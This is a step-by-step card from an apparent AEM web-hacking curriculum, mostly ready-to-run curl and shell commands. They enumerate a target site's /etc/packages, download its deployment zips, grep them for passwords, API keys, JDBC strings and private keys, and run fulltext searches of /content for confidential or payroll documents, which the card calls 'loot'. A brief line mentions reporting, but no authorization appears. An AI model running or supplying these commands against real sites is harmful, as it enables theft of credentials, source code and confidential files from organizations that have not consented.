# Batch 08 — Packages + secret files

## GOAL
Download deployment zips and hunt files that hold passwords/source. Save loot **outside git**.

## TIME
~1–2 hours

## YOU NEED
- Leads from batch 07
- Folder like `~/loot/aem/` (not in the notes repo)

---

## WHY (30 seconds)

When companies deploy AEM code, zips often land under `/etc/packages`.  
Those zips can hold **source code + database passwords + API keys**.  
Also authors drop “private” PDFs under `/content` like a messy shared drive.  
This card is pure loot collection — no fancy bugs.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
QB="PASTE_WORKING_QB"
mkdir -p ~/loot/aem && cd ~/loot/aem
```

### 1) List packages

```bash
curl -sk -G "$QB" \
  --data-urlencode "path=/etc/packages" \
  --data-urlencode "p.limit=100" -o packages.json
head -c 800 packages.json; echo

curl -sk -o packages-1.json -w "%{http_code}\n" "$T/etc/packages.1.json"
```

### 2) Download 1–3 zips (fix paths from JSON)

```bash
# CHANGE the path to a real one from packages.json
curl -sk -O "$T/etc/packages/my_packages/something.zip"
ls -la
```

### 3) Open and grep (offline)

```bash
unzip -l something.zip | head -30
unzip -o something.zip -d pkg1
grep -RniE 'password|secret|api[_-]?key|jdbc:|AKIA|PRIVATE KEY' pkg1 | head -40
```

### 4) Content keyword pass (if no zips)

```bash
for term in confidential internal backup payroll earnings; do
  echo "===== $term ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=/content" \
    --data-urlencode "fulltext=$term" \
    --data-urlencode "p.limit=8" | head -c 250
  echo
done
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Real secrets | Screenshot + report notes. Keep files private |
| Packages blocked | Content mining only — still valid |
| Done for today | Go **NEXT** (XSS track) |

---

## NEXT
→ [09-xss-rawcontent.md](./09-xss-rawcontent.md)
